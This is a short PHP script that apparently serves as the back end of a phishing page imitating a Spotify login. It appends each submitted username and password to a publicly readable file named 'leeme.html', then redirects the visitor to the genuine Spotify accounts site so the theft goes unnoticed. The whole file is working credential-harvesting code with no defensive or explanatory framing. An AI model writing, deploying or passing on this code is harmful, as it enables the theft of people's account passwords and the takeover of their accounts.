<?php

file_put_contents("leeme.html", "email: " . $_POST['username'] . "\npass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.spotify.com/');
exit();
